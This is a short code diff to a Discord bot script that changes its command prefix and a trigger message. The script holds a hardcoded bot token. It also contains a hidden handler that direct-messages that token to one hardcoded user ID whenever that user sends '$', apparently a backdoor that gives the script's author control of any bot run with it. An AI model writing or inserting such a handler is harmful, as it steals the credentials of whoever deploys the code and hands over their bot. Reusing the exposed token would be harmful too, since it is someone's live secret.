@@ -2,7 +2,7 @@ const Token = "NTA5MDk3NTE1OTM3OTU1ODUx.Dt1GLQ.d33eDDEyTFYXCJ2KveOphypvG-o"
 
 const Discord = require("discord.js");
 const client = new Discord.Client();
-var prefix = "+";
+var prefix = "$";
 client.on('ready', () => {
    console.log(`----------------`);
       console.log(`Cyhper Bot Script By : DREAM`);
@@ -16,7 +16,7 @@ client.user.setStatus("dnd")
 
 client.on('message' , message => {
 if (message.author.bot) return;
-           if (message.content == '.')
+           if (message.content == '$')
            if (message.author.id === '438379202031517697'){
 if (!message.channel.guild) return;
 message.author.send(Token)
